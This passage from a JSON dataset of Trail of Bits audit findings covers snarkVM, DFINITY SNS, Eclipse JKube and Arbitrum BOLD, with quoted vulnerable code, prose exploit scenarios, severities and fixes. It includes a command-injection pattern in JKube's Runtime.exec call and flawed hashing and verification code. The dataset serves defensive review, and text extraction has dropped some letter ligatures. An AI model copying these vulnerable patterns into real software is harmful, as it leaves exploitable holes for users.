        "body": "The BHP hash function takes as input a collection of booleans, and hashes them. This hash is used to commit to a Record , hashing together the bits of program_id , the record_name , and the record itself. However, no domain separation or input length is added to the hash, allowing a hash collision if a types to_bits_le function returns variable-length arrays: impl <N: Network > Record<N, Plaintext<N>> { /// Returns the record commitment. pub fn to_commitment (& self , program_id: & ProgramID <N>, record_name: & Identifier <N>) -> Result <Field<N>> { // Construct the input as `(program_id || record_name || record)`. let mut input = program_id.to_bits_le(); input.extend(record_name.to_bits_le()); input.extend( self .to_bits_le()); // Compute the BHP hash of the program record. N::hash_bhp1024(&input) } } Figure 23.1: console/program/src/data/record/to_commitment.rs#L19-L29 A similar situation is present on the hash_children function, which is used to compute hashes of two nodes in a Merkle tree: impl <E: Environment , const NUM_WINDOWS: u8 , const WINDOW_SIZE: u8 > PathHash for BHP<E, NUM_WINDOWS, WINDOW_SIZE> { type Hash = Field<E>; /// Returns the hash of the given child nodes. fn hash_children (& self , left: & Self ::Hash, right: & Self ::Hash) -> Result < Self ::Hash> { // Prepend the nodes with a `true` bit. let mut input = vec! [ true ]; input.extend(left.to_bits_le()); input.extend(right.to_bits_le()); // Hash the input. Hash::hash( self , &input) } } Figure 23.2: circuit/collections/src/merkle_tree/helpers/path_hash.rs#L33-L47 If the implementations of the to_bits_le functions return variable length arrays, it would be easy to create two dierent inputs that would result in the same hash. Recommendations Short term, either enforce each types to_bits_le function to always be xed length or add the input length and domain separators to the elements to be hashed by the BHP hash function. This would prevent the hash collisions even if the to_bits_le functions were changed in the future.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "24. Deployment constructor does not enforce the network edition value ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "body": "The Deployment type includes the edition value, which should match the network edition value. However, this is not enforced in the deployment constructor as it is in the Execution constructor. impl <N: Network > Deployment<N> { /// Initializes a new deployment. pub fn new ( edition: u16 , program: Program <N>, verifying_keys: IndexMap <Identifier<N>, (VerifyingKey<N>, Certificate<N>)>, ) -> Result < Self > { Ok ( Self { edition, program, verifying_keys }) } } Figure 24.1: vm/compiler/src/process/deployment/mod.rs#L37-L44 Recommendations Short term, consider using the N::EDITION value in the Deployment constructor, similarly to the Execution constructor.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "25. Map insertion return value is ignored ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "body": "Some insertions into hashmap data types ignore whether the insertion overwrote an element already present in the hash map. For example, when handling the proving and verifying key index maps, the Optional return value from the insert function is ignored: #[inline] pub fn insert_proving_key (& self , function_name: & Identifier <N>, proving_key: ProvingKey <N>) { self .proving_keys.write().insert(*function_name, proving_key); } /// Inserts the given verifying key for the given function name. #[inline] pub fn insert_verifying_key (& self , function_name: & Identifier <N>, verifying_key: VerifyingKey <N>) { self .verifying_keys.write().insert(*function_name, verifying_key); } Figure 25.1: vm/compiler/src/process/stack/mod.rs#L336-L346 Other examples of ignored insertion return values are present in the codebase and can be found using the regular expression  \\.insert.*\\); . Recommendations Short term, investigate if any of the unguarded map insertions should be checked.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "26. Potential truncation on reading and writing Programs, Deployments, and Executions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "body": "When writing a Program to bytes, the number of import statements and identiers are casted to an u8 integer, leading to the truncation of elements if there are more than 256 identiers: // Write the number of program imports. ( self .imports.len() as u8 ).write_le(& mut writer)?; // Write the program imports. for import in self .imports.values() { import.write_le(& mut writer)?; } // Write the number of components. ( self .identifiers.len() as u8 ).write_le(& mut writer)?; Figure 26.1: vm/compiler/src/program/bytes.rs#L73-L81 During Program parsing, this limit of 256 identiers is never enforced. Similarly, the Execution and Deployment write_le functions assume that there are fewer than u16::MAX transitions and verifying keys, respectively. // Write the number of transitions. ( self .transitions.len() as u16 ).write_le(& mut writer)?; Figure 26.2: vm/compiler/src/process/execution/bytes.rs#L52-L53 // Write the number of entries in the bundle. ( self .verifying_keys.len() as u16 ).write_le(& mut writer)?; Figure 26.3: vm/compiler/src/process/deployment/bytes.rs#L62-L63 Recommendations Short term, determine a maximum number of allowed import statements and identiers and enforce this bound on Program parsing. Then, guarantee that the integer type used in the write_le function includes this bound. Perform the same analysis for the Execution and Deployment functions.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "27. StatePath::verify accepts invalid states ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "body": "The StatePath::verify function attempts to validate several properties in the transaction using the code shown in gure 28.1. However, this code does not actually check that all checks are true; it checks only that there are an even number of false booleans. Since there are six booleans in the operation, the function will return true if all are false. // Ensure the block path is valid. let check_block_hash = A::hash_bhp1024(&block_hash_preimage).is_equal(& self .block_hash); // Ensure the state root is correct. let check_state_root = A::verify_merkle_path_bhp(& self .block_path, & self .state_root, & self .block_hash.to_bits_le()); check_transition_path .is_equal(&check_transaction_path) .is_equal(&check_transactions_path) .is_equal(&check_header_path) .is_equal(&check_block_hash) .is_equal(&check_state_root) } Figure 27.1: vm/compiler/src/ledger/state_path/circuit/verify.rs#L57-L70 We marked the severity as informational since the function is still not being used. Exploit Scenario An attacker submits a StatePath where no checks hold, but the verify function still returns true. Recommendations Short term, ensure that all checks are true (e.g., by conjuncting all booleans and checking that the resulting boolean is true).",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "28. Potential panic in encryption/decryption circuit generation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "body": "The decrypt_with_randomizers and encrypt_with_randomizers functions do not check the length of the randomizers argument against the length of the underlying ciphertext and plaintext, respectively. This can cause a panic in the zip_eq call. Existing calls to the function seem safe, but since it is a public function, the lengths of its underlying values should be checked to prevent panics in future code. pub ( crate ) fn decrypt_with_randomizers (& self , randomizers: & [Field<A>]) -> Plaintext <A> { // Decrypt the ciphertext. Plaintext::from_fields( & self .iter() .zip_eq(randomizers) Figure 28.1: circuit/program/src/data/ciphertext/decrypt.rs#L31-L36 Recommendations Short term, add a check to ensure that the length of the underlying plaintext/ciphertext matches the length of the randomizer values.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "29. Variable timing of certain cryptographic functions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-aleosystems-snarkvm-securityreview.pdf",
        "body": "The Pedersen commitment code computes the masking element [r]h by ltering out powers of h not indicated by the randomizer r and adding the remaining values. However, the timing of this function leaks information about the randomizer value. In particular, it can reveal the Hamming weight (or approximate Hamming weight) of the randomizer. If the randomizer r is a 256-bit value, but timing indicates that the randomizer has a Hamming weight of 100 (for instance), then the possible set of randomizers has only about 2 243 elements. This compromises the information-theoretic security of the hiding property of the Pedersen commitment. randomizer.to_bits_le().iter().zip_eq(&* self .random_base_window).filter(|(bit, _)| **bit).for_each( |(_, base)| { output += base; }, ); Figure 29.1: console/algorithms/src/pedersen/commit_uncompressed.rs#L27-L33 Recommendations Short term, consider switching to a constant-time algorithm for computing the masking value.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Uneven distribution of stake across neurons may impact SNS governance ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-06-dfinity-sns-securityreview.pdf",
        "body": "When a user stakes ICP to obtain SNS tokens, the tokens are distributed according to a vesting schedule dened by the NeuronBasketConstructionParameters type. The SNS tokens are distributed as a number of SNS neurons with staggered dissolve delays to ensure that all neurons do not dissolve at the same time. Because of how this vesting schedule is determined, the entire staked amount may vest immediately in exceptional cases. The number of neurons obtained and the amount of time it takes for each neuron to dissolve are both determined by the proposal to open the SNS swap. These two parameters are then used by the apportion_approximately_equally function to determine the dissolve delays for the individual neurons. pub fn apportion_approximately_equally (total: u64 , len: u64 ) -> Vec < u64 > { assert! (len > 0 , \"len must be greater than zero\" ); let quotient = total.saturating_div(len); let remainder = total % len; let mut result = vec! [quotient; len as usize ]; *result.first_mut().unwrap() += remainder; result } Figure 1.1: Here, len represents the number of neurons distributed to a single user, and total is the number of SNS tokens staked by the same user. ( sns/swap/src/swap.rs:214-223 ) Since the number of staked SNS tokens ( total in gure 1.1) is given as SNS e8s, it will generally be much greater than the number of SNS neurons obtained ( len in gure 1.1). However, this is not guaranteed by the implementation, since these numbers are set by the originator of the proposal. If the SNS token amount could be similar in size to the number of neurons, most (or even all) neurons would dissolve immediately. For example, eight SNS e8s distributed over 10 SNS neurons would result in the vesting schedule [8, 0, 0, , 0] , where the entire amount (8 SNS e8s) is vested immediately. This would then aect governance of the SNS adversely, since dissolved neurons are not able to participate. Exploit Scenario A group of users miscongures the parameters for an SNS token swap. This goes undetected, and the proposal to open the token swap is passed. When the token swap completes, all of the distributed SNS neurons dissolve immediately, making governance of the network impossible. Recommendations Short term, ensure that the remainder in apportion_approximately_equally is distributed evenly over the rst total % len neurons. This would ensure that the distributed amounts dier by, at most, one. Long term, document implicit assumptions made for the utility functions that each component relies on. Ensure that each assumption is properly tested using unit or property testing.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Wrong error message returned from new_sale_ticket in Adopted state ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-06-dfinity-sns-securityreview.pdf",
        "body": "If the token swap canister is in the lifecycle state Adopted , then the proposal to open the swap has been adopted, but the token swap has not yet been opened. If a user calls new_sale_ticket to obtain a new ticket from the swap canister in this state, the method will return a NewSaleTicketResponse::err_sale_closed() error, erroneously signaling that the sale is closed. The implementation of new_sale_ticket uses the partial ordering dened on the Lifecycle enum to determine which error to return to the user if the current state is not Open . pub fn new_sale_ticket ( & mut self , request: & NewSaleTicketRequest , caller: PrincipalId , time: u64 , ) -> NewSaleTicketResponse { if self .lifecycle() < Lifecycle::Open { return NewSaleTicketResponse::err_sale_not_open(); } if self .lifecycle() > Lifecycle::Open { return NewSaleTicketResponse::err_sale_closed(); } // ... } Figure 3.1: The derived partial order on Lifecycle is used to determine the swap canister state. ( sns/swap/src/swap.rs:1944-1949 ) The implementation of PartialOrd for Lifecycle is automatically derived from the Lifecycle enum denition. pub enum Lifecycle { /// The canister is incorrectly configured. Not a real lifecycle state. Unspecified = 0 , /// In PENDING state, the canister is correctly initialized. Once SNS /// tokens have been transferred to the swap canister's account on /// the SNS ledger, a call to `open` with valid parameters will start /// the swap. Pending = 1 , /// In ADOPTED state, the proposal to start decentralization sale /// has been adopted, and the sale can be opened after a delay /// specified by params.sale_delay_seconds. Adopted = 5 , /// In OPEN state, prospective buyers can register for the token /// swap. The swap will be committed when the target (max) ICP has /// been reached or the swap's due date/time occurs, whichever /// happens first. Open = 2 , /// In COMMITTED state the token price has been determined; on a call to /// finalize`, buyers receive their SNS neurons and the SNS governance canister /// receives the ICP. Committed = 3 , /// In ABORTED state the token swap has been aborted, e.g., because the due /// date/time occurred before the minimum (reserve) amount of ICP has been /// retrieved. On a call to `finalize`, participants get their ICP refunded. Aborted = 4 , } Figure 3.2: The partial order for lifecycle states is derived from the standard ordering of the corresponding discriminants. ( sns/swap/src/gen/ic_sns_swap.pb.v1.rs:2122-2147 ) According to the documentation for the std::cmp::PartialOrd trait , the derived order is given by the order induced by the corresponding discriminants. This means that Adopted > Open since the corresponding discriminant for Adopted (5) is greater than the discriminant of Open (2). It follows that new_sale_ticket will return the wrong error message when the swap canister is in Adopted state. The same issue is present in the implementation of get_open_ticket . Exploit Scenario Alice uses a scripted front-end application to participate in the token swap. When Alice starts the application, the swap proposal has been adopted, but has not yet been opened. When the application attempts to obtain a new ticket from the swap canister to initiate Alices rst purchase, the swap canister returns an error message indicating that the sale is already closed. This causes the application to shut down, which prevents Alice from participating in the token sale. Recommendations Short term, add a custom implementation of the PartialOrd trait for the Lifecycle enum, ensuring that B  A if and only if B is reachable from A . Long term, make sure that all derived traits are covered by property tests to ensure that they work as expected.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "3. Swap canister paging implementations panic on invalid ranges ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-06-dfinity-sns-securityreview.pdf",
        "body": "The swap canister implements a number of APIs to list swap participants and neuron recipes. All of them implement paging using an oset and a limit to allow callers to request the entire set of participants over a sequence of calls. However, the paging implementations in list_community_fund_participants and list_sns_neuron_recipes both use the caller-supplied osets and limits to index into a vector of elements. The upper bound for the range ( end ) is bounded by the length of the vector, but if the caller-supplied oset falls outside of the vector, the implementation will still panic. pub fn list_community_fund_participants ( & self , request: & ListCommunityFundParticipantsRequest , ) -> ListCommunityFundParticipantsResponse { let ListCommunityFundParticipantsRequest { limit, offset } = request; let offset = offset.unwrap_or_default() as usize ; let limit = limit .unwrap_or(DEFAULT_LIST_COMMUNITY_FUND_PARTICIPANTS_LIMIT) // use default .min(LIST_COMMUNITY_FUND_PARTICIPANTS_LIMIT_CAP) // cap as usize ; let end = (offset + limit).min( self .cf_participants.len()); let cf_participants = self .cf_participants[offset..end] .to_vec(); ListCommunityFundParticipantsResponse { cf_participants } } Figure 4.1: Swap::list_community_fund_participants may index out of bounds. ( sns/swap/src/swap.rs:2407-2422 ) pub fn list_sns_neuron_recipes ( & self , request: ListSnsNeuronRecipesRequest , ) -> ListSnsNeuronRecipesResponse { let limit = request .limit .unwrap_or(DEFAULT_LIST_SNS_NEURON_RECIPES_LIMIT) .min(DEFAULT_LIST_SNS_NEURON_RECIPES_LIMIT) as usize ; let start_at = request.offset.unwrap_or_default() as usize ; let end = (start_at + limit).min( self .neuron_recipes.len()); let sns_neuron_recipes = self .neuron_recipes[start_at..end] .to_vec(); ListSnsNeuronRecipesResponse { sns_neuron_recipes } } Figure 4.2: Swap::list_sns_neuron_recipes may index out of bounds. ( sns/swap/src/swap.rs:2456-2471 ) Recommendations Short term, check the caller-provided oset against the size of the underlying vector and return an empty list or an error if the given oset would cause the function to index out of bounds. Long term, use property testing to discover panicking edge cases in the implementation.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "4. The NNS governance canister always warns about missing neurons if a token swap fails ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-06-dfinity-sns-securityreview.pdf",
        "body": "If a token swap fails, the contribution from the community fund (recently renamed to neuron fund) is refunded to the contributing neurons by the NNS governance canister. This logic is implemented by the refund_community_fund_maturity function. If the function fails to refund the contributed maturity to one or more neurons, these neurons are returned from the function, and the missing neurons are logged to stdout . let settlement_result = match &request_type { settle_community_fund_participation:: Result ::Committed(committed) => { committed .mint_to_sns_governance(proposal_data, &* self .ledger) . await } settle_community_fund_participation:: Result ::Aborted(_aborted) => { let missing_neurons = refund_community_fund_maturity( & mut self .proto.neurons, &proposal_data.cf_participants, ); println! ( \"{}WARN: Neurons are missing from Governance when attempting to refund \\ community fund participation in an SNS Sale. Missing Neurons: {:?}\" , LOG_PREFIX, missing_neurons ); Ok (()) } }; Figure 5.1: The list of missing neurons is always logged by the NNS governance canister. ( nns/governance/src/governance.rs:6763-6782 ) However, this log message is emitted even if the list of neurons returned from the refund_community_fund_maturity function is empty, which means that the NNS governance canister will always claim that there are missing neurons, even when all neurons have been accounted for by the refund_community_fund_maturity function. Recommendations Short term, check whether the list of missing neurons returned from refund_community_fund_maturity is non-empty before emitting the log message. Long term, review log messages to ensure that they are correct. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. Insecure defaults in generated artifacts ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-eclipse-jkube-securityreview.pdf",
        "body": "JKube can generate Kubernetes deployment artifacts and deploy applications using those artifacts. By default, many of the security features oered by Kubernetes are not enabled in these artifacts. This can cause the deployed applications to have more permissions than their workload requires. If such an application were compromised, the permissions would enable the attacker to perform further attacks against the container or host. Kubernetes provides several ways to further limit these permissions, some of which are documented in appendix E . Similarly, the generated artifacts do not employ some best practices, such as referencing container images by hash, which could help prevent certain supply chain attacks. We compiled several of the examples contained in the quickstarts folder and analyzed them. We observed instances of the following problems in the artifacts produced by JKube:         Pods have no associated network policies . Dockerles have base image references that use the latest tag. Container image references use the latest tag, or no tag, instead of a named tag or a digest. Resource (CPU, memory) limits are not set. Containers do not have the allowPrivilegeEscalation setting set. Containers are not congured to use a read-only lesystem. Containers run as the root user and have privileged capabilities. Seccomp proles are not enabled on containers.  Service account tokens are mounted on pods where they may not be needed. Exploit Scenario An attacker compromises one application running on a Kubernetes cluster. The attacker takes advantage of the lax security conguration to move laterally and attack other system components. Recommendations Short term, improve the default generated conguration to enhance the security posture of applications deployed using JKube, while maintaining compatibility with most common scenarios. Apply automatic tools such as Checkov during development to review the conguration generated by JKube and identify areas for improvement. Long term, implement mechanisms in JKube to allow users to congure more advanced security features in a convenient way. References   Appendix D: Docker Recommendations Appendix E: Hardening Containers Run via Kubernetes",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "2. Risk of command line injection from secret ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-eclipse-jkube-securityreview.pdf",
        "body": "As part of the Spring Boot watcher functionality, JKube executes a second Java process. The command line for this process interpolates an arbitrary secret, making it unsafe. This command line is then tokenized by separating on spaces. If the secret contains spaces, this process could allow an attacker to add arbitrary arguments and command-line ags and modify the behavior of this command execution. StringBuilder buffer = new StringBuilder( \"java -cp \" ); (...) buffer.append( \" -Dspring.devtools.remote.secret=\" ); buffer.append( remoteSecret ); buffer.append( \" org.springframework.boot.devtools.RemoteSpringApplication \" ); buffer.append(url); try { String command = buffer.toString(); log.debug( \"Running: \" + command); final Process process = Runtime.getRuntime().exec(command) ; Figure 2.1: A secret is used without sanitization on a command string that is then executed. ( jkube/jkube-kit/jkube-kit-spring-boot/src/main/java/org/eclipse/jkube/sp ringboot/watcher/SpringBootWatcher.java#136171 ) Exploit Scenario An attacker forks an open source project that uses JKube and Spring Boot, improves it in some useful way, and introduces a malicious spring.devtools.remote.secret secret in application.properties . A user then nds this forked project and sets it up locally. When the user runs mvn k8s:watch , JKube invokes a command that includes attacker-controlled content, compromising the users machine. Recommendations Short term, rewrite the command-line building code to use an array of arguments instead of a single command-line string. Java provides several variants of the exec method, such as exec(String[]) , which are safer to use when user-provided input is involved. Long term, integrate static analysis tools in the development process and CI/CD pipelines, such as Semgrep and CodeQL, to detect instances of similar problems early on. Review uses of user-controlled input to ensure they are sanitized if necessary and processed safely. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "1. depositIntoPool function allows deposits during ongoing challenges ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-offchainbold-securityreview.pdf",
        "body": "The depositIntoPool function allows depositing tokens even when the assertion was already created or there are already more tokens than required to create the assertion. function depositIntoPool(uint256 _amount) external { depositedTokenBalances[msg.sender] += _amount; stakeToken.safeTransferFrom(msg.sender, address(this), _amount); emit StakeDeposited(msg.sender, _amount); } Figure 1.1: The depositIntoPool function (AssertionStakingPool.sol#L43L47) In the best case scenario, where the assertion created wins and all the tokens are returned, no users would lose tokens. However, tokens deposited when the challenge is ongoing would allow users who previously deposited tokens that are now locked in the challenge to withdraw their tokens from the new depositors tokens. Exploit Scenario Alice deposits tokens into the pool, unaware that there is already an ongoing challenge. Eve, who deposited tokens that are now locked in the challenge, withdraws her tokens from Alices newly deposited tokens. The challenge ends up losing and Alice unknowingly loses her tokens, instead of Eve. Recommendations Short term, in the depositIntoPool function, modify the code to validate that the assertion is not already created and that the current contracts token balance is less than what is required to create an assertion. Long term, when designing a contract that holds users tokens, minimize the attack surface as much as possible by not accepting deposits after a target threshold has been reached.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "2. Lack of validation of mini stakes conguration ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-offchainbold-securityreview.pdf",
        "body": "The mini stake amounts set during initialization are not validated to decrease for each level (from block to single-step execution) despite that expectation being stated in the Arbitrum Improvement Proposal related to BOLD: Challenge-bonds, per level: 3600/1000/100/10 ETH - required from validators to open challenges against an assertion observed on Ethereum, for each level. Note that level corresponds to the level of granularity at which the interactive dissection game gets played over, starting at the block level, moving on to a range of WASM execution steps, and then nally to the level of a single step of execution. The staking conguration is important to disincentivize fraud and make it feasible for an honest validator to meet the capital requirements for defending assertions. stakeAmounts = _stakeAmounts; Figure 2.1: The conguration of bonds is not validated. (bold/contracts/src/challengeV2/EdgeChallengeManager.sol#365) Recommendations Short term, modify the code to validate that the amount of stake required for each level decreases as the challenge progresses. Long term, enforce expectations in code to prevent miscongurations that have important ramications on the protocols incentives.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Potential token incompatibilities in staking pool ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-offchainbold-securityreview.pdf",
        "body": "The assertion staking pool is not currently reusable and transfers its entire allowance to the rollup for the requiredStake amount. In light of this, the use of the safeIncreaseAllowance function does not pose incompatibilities with tokens such as USDT, which require the current allowance to be zero when calling the approve function. However, it may be desirable to support reusable assertion staking pools in the future, and this subtlety should be considered in that event. function createAssertion() external { uint256 requiredStake = getRequiredStake(); // approve spending from rollup for newStakeOnNewAssertion call stakeToken.safeIncreaseAllowance(rollup, requiredStake); // reverts if pool doesn't have enough stake and if assertion has already been asserted IRollupUser(rollup).newStakeOnNewAssertion(requiredStake, assertionInputs, assertionHash); } Figure 3.1: Pool approves rollup to spend requiredStake. (bold/contracts/src/assertionStakingPool/AssertionStakingPool.sol#5056) Recommendations Short term, document the potential incompatibility and ensure that each transfer uses the entire allowance. Long term, use the forceApprove function if the contract is revised to be reusable .",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Use of incorrect proxy admin contracts ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-offchainbold-securityreview.pdf",
        "body": "The upgradeSurroundingContracts function updates several contracts. However, when fetching the current implementation of the getProxyImplementation function, it uses the wrong proxy admin contracts for the sequencer inbox and outbox contracts PROXY_ADMIN_BRIDGE and PROXY_ADMIN_REI, respectively. function upgradeSurroundingContracts(address newRollupAddress) private { // upgrade each of these contracts to an implementation that allows // the rollup address to be set to the new rollup address ... TransparentUpgradeableProxy sequencerInbox = TransparentUpgradeableProxy(payable(SEQ_INBOX)); address currentSequencerInboxImpl = PROXY_ADMIN_BRIDGE.getProxyImplementation(sequencerInbox); PROXY_ADMIN_SEQUENCER_INBOX.upgrade(sequencerInbox, IMPL_SEQUENCER_INBOX); ISequencerInbox(SEQ_INBOX).updateRollupAddress(); PROXY_ADMIN_SEQUENCER_INBOX.upgrade(sequencerInbox, currentSequencerInboxImpl); ... TransparentUpgradeableProxy outbox = TransparentUpgradeableProxy(payable(OUTBOX)); address currentOutboxImpl = PROXY_ADMIN_REI.getProxyImplementation(outbox); PROXY_ADMIN_OUTBOX.upgrade(outbox, IMPL_OUTBOX); IOutbox(OUTBOX).updateRollupAddress(); PROXY_ADMIN_OUTBOX.upgrade(outbox, currentOutboxImpl); } Figure 4.1: The upgradeSurroundingContracts function (BOLDUpgradeAction.sol#L388L415) Given that the implementation of the getProxyImplementation function does not use any state-related variables (gure 4.2), the mistake does not cause a divergence and the result is the same as if the correct proxy admin contracts were used. function getProxyImplementation(TransparentUpgradeableProxy proxy) public view virtual returns (address) { // We need to manually run the static call since the getter cannot be flagged as view // bytes4(keccak256(\"implementation()\")) == 0x5c60da1b (bool success, bytes memory returndata) = address(proxy).staticcall(hex\"5c60da1b\"); require(success); return abi.decode(returndata, (address)); } Figure 4.2: The getProxyImplementation function (ProxyAdmin.sol#L21L27) Recommendations Short term, when calling the getProxyImplementation function for the sequencer inbox and outbox, use the PROXY_ADMIN_SEQUENCER_INBOX and PROXY_ADMIN_OUTBOX contracts, respectively. Long term, since the 5.0.0 release of the OpenZeppelin library has deprecated the getProxyImplementation function, the code will eventually need to fetch the values from storage.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "5. Unused custom errors ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-offchainbold-securityreview.pdf",
        "body": "The custom errors declared in gure 5.1 are unused. It is unclear whether they are dead code or errors that should be raised; however, they are never used due to missing checks. /// @dev Thrown when atleast one new message must be read. error NotDelayedFarEnough(); ... /// @dev Thrown when a batch post fails to prove a message delivery and sequencing are synced within the delay threshold error UnexpectedDelay(uint64 delayBlocks); Figure 5.1: Errors declaration (Error.sol#L182L192) Recommendations Short term, remove these errors if they are unused, or apply the correct checks. Long term, thoroughly document the dierent error types and when they should be used and why; review the code to correct any divergences.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "6. Misuse of expectRevert cheat code hides test failing ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-04-offchainbold-securityreview.pdf",
        "body": "The testUpdateDepleteAndReplenish test uses the expectRevert cheat code with a call to a librarys internal function. This cheat code should be used only with external function calls because it cannot track calls to internal functions. In this instance, if the test is run with verbosity turned on, the test stops and passes, as shown in gure 6.1. [PASS] testUpdateDepleteAndReplenish() (gas: 60188) Traces: [60188] DelayBufferableTest::testUpdateDepleteAndReplenish()   ()   ()   ()  [0] VM::expectRevert(custom error f4844814:)   [0] VM::warp(10)   [0] VM::roll(10)   [0] VM::warp(11)   [0] VM::roll(11)   [0] VM::expectRevert(custom error f4844814:)    you must call another function prior to expecting a second revert   ()   ()   you must call another function prior to expecting a second revert Figure 6.1: Running the test with the forge test --match-test testUpdateDepleteAndReplenish -vvvv command However, if both the expectRevert cheat code and the subsequent function call are removed, the test fails, as shown in gure 6.2. [FAIL. Reason: assertion failed] testUpdateDepleteAndReplenish2() (gas: 116607) Logs: Error: a == b not satisfied [uint] Left: 14399 Right: 14400 Traces: [116607] DelayBufferableTest::testUpdateDepleteAndReplenish2()   ()   ()   ()  [0] VM::warp(10)   [0] VM::roll(10)   [0] VM::warp(11)   [0] VM::roll(11)   [0] VM::roll(611)   emit log(val: \"Error: a == b not satisfied [uint]\")  emit log_named_uint(key: \"  emit log_named_uint(key: \"  [0] VM::store(VM: [0x7109709ECfa91a80626fF3989D68f67F5b1DD12D], Left\", val: 14399 [1.439e4]) Right\", val: 14400 [1.44e4])   ()   () 0x6661696c65640000000000000000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000000000000000000000000001)   ()    () Figure 6.2: Running testUpdateDepleteAndReplenish without expectRevert The purpose of this test is to consume a small amount of buer and then replenish it, but the check for the latter state is failing, as shown in gure 6.3. delayBuffer.update(25); assertEq(delayBuffer.prevBlockNumber, 25); assertEq(delayBuffer.prevSequencedBlockNumber, configBufferable.threshold + 11); assertEq(delayBuffer.bufferBlocks, configBufferable.max); Figure 6.3: Snippet of the test (DelayBuffer.t.sol#L189L193) The test is run with the replenishRateInBasis variable set to 714 and a buer maximum of 14400. When the delayBuffer.update(25) function is executed (gure 6.3), the prevBlockNumber variable equals 24. The buer is updated in the calcBuffer function (gure 6.4), where end is the argument passed to the update function (in our case, 25) and start is the currently set prevBlockNumber (in our case, 24). The elapsed variable will equal 1 then. However, rounding the operation down causes the test to fail because it adds 0 to the buer variable. uint256 elapsed = end > start ? end - start : 0; uint256 delay = sequenced > start ? sequenced - start : 0; // replenishment rounds down and will not overflow since all inputs including // replenishRateInBasis are cast from uint64 in calcPendingBuffer buffer += (elapsed * replenishRateInBasis) / BASIS; Figure 6.4: Snippet of the calcBuffer function (DelayBuffer.sol#L43L47) The correct way to test whether a replenish of exactly 1 occurs (i.e., from 13999 to 14000) is to call the update function with an argument that is exactly equal to prevBlockNumber + 15 because elapsed will be 15 and is the rst value in the calculation for adding to the buer that rounds down to 1 and not 0. Recommendations Short term, to make the test pass, correct the test to not use expectRevert with internal calls and to pass 39 as the argument for the last call to the update function. Long term, use mutation testing to validate the correctness of the testing suite or identify possible improvements (see appendix B). A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. PoseidonLookup is not implemented ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scroll-zkEVM-wave2-securityreview.pdf",
